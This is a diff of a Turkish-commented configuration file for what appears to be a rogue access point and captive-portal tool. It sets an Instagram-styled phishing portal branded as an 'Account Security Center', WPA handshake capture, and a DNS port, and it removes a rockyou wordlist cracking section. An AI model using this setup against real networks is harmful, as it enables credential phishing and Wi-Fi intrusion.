@@ -27,6 +27,8 @@ DHCP_START="10.0.0.10"
 DHCP_END="10.0.0.100"
 DHCP_LEASE="12h"
 PORTAL_PORT=80
+# Yetkili istemciler için yerel çözümleyici portu (53 dışında olmalı)
+AUTH_DNS_PORT=5399
 
 # Doğrulama sonrası gerçek internet verilsin mi?
 SHARE_INTERNET=1
@@ -37,6 +39,5 @@ PORTAL_TEMPLATE="instagram"
 BRAND="Hesap Güvenliği Merkezi"
 SUCCESS_URL="https://www.google.com"
 
-# ---------- Handshake kırma -----------------------------------
-WORDLIST="/usr/share/wordlists/rockyou.txt"
+# ---------- Handshake yakalama ---------------------------------
 CAPTURE_TIMEOUT="60"
